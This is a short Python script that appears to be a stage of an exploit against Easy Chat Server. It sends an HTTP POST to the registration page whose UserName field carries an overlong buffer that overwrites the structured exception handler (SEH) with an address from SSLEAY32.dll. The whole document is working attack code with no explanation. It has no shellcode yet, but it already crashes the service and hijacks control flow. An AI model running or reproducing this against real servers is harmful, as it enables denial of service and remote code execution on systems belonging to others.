#!/usr/bin/python

import socket
import os
import sys

ip = "192.168.100.120"
port = 80

nSeh = "B" * 4
Seh  = "\x94\x8c\x01\x10" # 0x10018c94 from C:\EFS Software\Easy Chat Server\SSLEAY32.dll

# 10263
crash  = "A" * 217
crash += nSeh
crash += Seh
crash += "D" * (10263 - len(crash))

req  = "POST /registresult.htm HTTP/1.1\r\n"
req += "Host: 192.168.100.120\r\n"
req += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\r\n"
req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
req += "Accept-Language: en-US,en;q=0.5\r\n"
req += "Accept-Encoding: gzip, deflate\r\n"
req += "Referer: http://192.168.100.120/register.ghp\r\n"
req += "Content-Type: application/x-www-form-urlencoded\r\n"
req += "Content-Length: 184\r\n"
req += "Connection: close\r\nUpgrade-Insecure-Requests: 1\r\n\r\n"
req += "UserName=" + crash
req += "&Password=trune&Password1=trune&Sex=1&Email=tune%40gmail.com&Icon=0.gif&Resume=we&cw=1&RoomID=%3C%21--%24RoomID--%3E&RepUserName=%3C%21--%24UserName--%3E&submit1=Register&'"

expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect((ip, port))
expl.send(req)
expl.close()

